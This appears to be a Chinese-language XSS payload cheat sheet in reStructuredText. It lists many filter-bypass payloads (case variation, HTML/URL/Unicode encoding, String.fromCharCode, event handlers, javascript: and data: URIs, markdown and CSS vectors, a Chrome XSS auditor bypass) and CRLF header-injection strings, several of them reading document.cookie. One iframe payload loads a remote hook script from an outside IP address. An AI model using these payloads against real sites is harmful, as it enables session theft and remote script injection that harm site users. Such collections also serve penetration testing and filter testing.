Payload
================================

弹框
---------------------------------------------------
::

    alert('我是个弹窗');
    confirm('我是个确认弹窗?');
    prompt('我是个输入框';


常用的XSS绕过payload
---------------------------------------------------
+ ``%26%2360;/u%26%2362;``
+ ``<img src="x" onerror=alert(1)>``
+ ``<img src="1" onerror=location="javascript:alert(1)">``
+ ``<img src="1" onerror=location="javascript:alert%281%29">``
+ ``<img src=1 onmouseover=alert('xss')>``
+ ``<img src=1 onerror=alert(1)>``
+ ``<iMg src=1 oNeRrOr=alert(1)>``
+ ``<ImG src=1 OnErRoR=alert(1)>``
+ ``<img src=1 onerror="alert(&quot;M&quot;)">``
+ ``<svg onload=alert(1)>``
+ ``onpointerrawupdate=(prompt)(123)%3E``   //这个事件只针对谷歌
+ ``<a href="javascript:alert(1)">baidu</a>``
+ ``<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>``
+ ``<script>alert('xss')</script>``
+ ``<script>prompt('xss')</script>``
+ ``<script>\u0061\u006c\u0065\u0072\u0074(1)</script>``
+ ``<script>alert(1)</script>``
+ ``<sCrIpT>alert(1)</sCrIpT>``
+ ``<ScRiPt>alert(1)</ScRiPt>``
+ ``<sCrIpT>alert(1)</ScRiPt>``
+ ``<ScRiPt>alert(1)</sCrIpT>``
+ ``%3Cscript%3Ealert(1)%3C/script%3E``
+ ``%253Cscript%253Ealert(1)%253C/script%253E``
+ ``&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;``
+ ``&#x253C;script&#x253E;alert(1)&#x253C;/script&#x3E;``
+ ``\u003Cscript\u003Ealert(1)\u003C/script\u003E``
+ ``<input value="" onclick=alert('xss') type="text">``
+ ``<input name="name" value="" onmouseover=prompt('xss') bad="">``
+ ``<iframe src="javascript:alert('xss')"><iframe>``
+ ``<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">``
+ ``<iframe src="aaa" onmouseover=alert('xss') /><iframe>``
+ ``<iframe src="javascript:prompt(`xss`)"></iframe>``
+ ``<embed id=x onfocus=alert(document.cookie) type=text/html autofocus>``
+ ``<object id=x onfocus=alert(1) type=text/html>``
+ ``eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))``
    适用于绕过黑名单 alert 在跨站中，String.fromCharCode 主要是使到
    一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为 ASCII 码，
    然后再用 String.fromCharCode 还原，因为大多数的过滤系统都不会把 String.fromCharCode
    加以过滤，例如关键字 alert 被过滤掉，那就可以这么利用 alert(document.cookie)
+ ``<marquee onscroll=alert(1)>``
+ ``<mArQuEe OnScRoLl=alert(1)>``
+ ``<MaRqUeE oNsCrOlL=alert(1)>``
+ ``<details/open/ontoggle=confirm('XSS')>``


特殊的绕过
---------------------------------------------------
+ ``<img src=x on(mouseover)=if(event.target.tagName=='IMG')(prompt)(1)>``
+ 利用 JavaScript 语句块绕过过滤。例如： ``<img src=x onmouseover="{if(1){prompt(1)}}">``
+ 利用 HTML 编码绕过过滤。例如： ``<img src=x onmouseover="&#x69;&#x66;&#x28;&#x31;&#x29;&#x7B;&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#x7D;">``
+ 利用特殊字符绕过过滤。例如 ``<img src=x onmouseover="ｐｒｏｍｐｔ(1)">``
+ 利用内联事件绑定绕过过滤。例如：
    ::
        
        <img src=x>
        <script>
        document.querySelector('img').onmouseover = function() { prompt(1) }
        </script>
+ 用 JavaScript 闭包绕过过滤。例如： ``<img src=x onmouseover="(function(){prompt(1)})();">``

伪协议
---------------------------------------------------
- ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/00/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/000/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/M/,alert(%22M%22)>M</a>``


Chrome XSS auditor bypass
---------------------------------------------------

- ``?param=https://&param=@z.exeye.io/import%20rel=import%3E``
- ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
- ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``

长度限制
---------------------------------------------------
:: 

    <script>s+="l"</script>
    \...
    <script>eval(s)</script>

jquery sourceMappingURL
---------------------------------------------------
    ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``

图片名
---------------------------------------------------
    ``"><img src=x onerror=alert(document.cookie)>.gif``

过期的payload
---------------------------------------------------
- src=javascript:alert基本不可以用
- css expression特性只在旧版本ie可用

css
---------------------------------------------------

::

    <div style="background-image:url(javascript:alert(/xss/))">
    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>


markdown
---------------------------------------------------

::

    [a](javascript:prompt(document.cookie))
    [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
    <&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
    ![a'"`onerror=prompt(document.cookie)](x)
    [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
    ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)


iframe
---------------------------------------------------

::

    <iframe onload='
        var sc   = document.createElement("scr" + "ipt");
        sc.type  = "text/javascr" + "ipt";
        sc.src   = "http://1.2.3.4/js/hook.js";
        document.body.appendChild(sc);
        '
    />

- ``<iframe src=javascript:alert(1)></iframe>``
- ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
- ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
- ``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``
- ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
- ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``

form
---------------------------------------------------

- ``<form action=javascript:alert(1)><input type=submit>``
- ``<form><button formaction=javascript:alert(1)>M``
- ``<form><input formaction=javascript:alert(1) type=submit value=M>``
- ``<form><input formaction=javascript:alert(1) type=image value=M>``
- ``<form><input formaction=javascript:alert(1) type=image src=1>``

meta
---------------------------------------------------

``<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">``

CRLF
---------------------------------------------------

- 探测漏洞
    ::


        %0d%0aheader:header
        %0aheader:header
        %0dheader:header
        %23%0dheader:header
        %3f%0dheader:header
        /%250aheader:header
        /%25250aheader:header
        /%%0a0aheader:header
        /%3f%0dheader:header
        /%23%0dheader:header
        /%25%30aheader:header
        /%25%30%61header:header
        /%u000aheader:header

- 开放重定向

	``/www.google.com/%2f%2e%2e%0d%0aheader:header``

- CRLF-XSS

	``%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e``

- XSS绕过

	``%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/``

- Location

	``%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E``
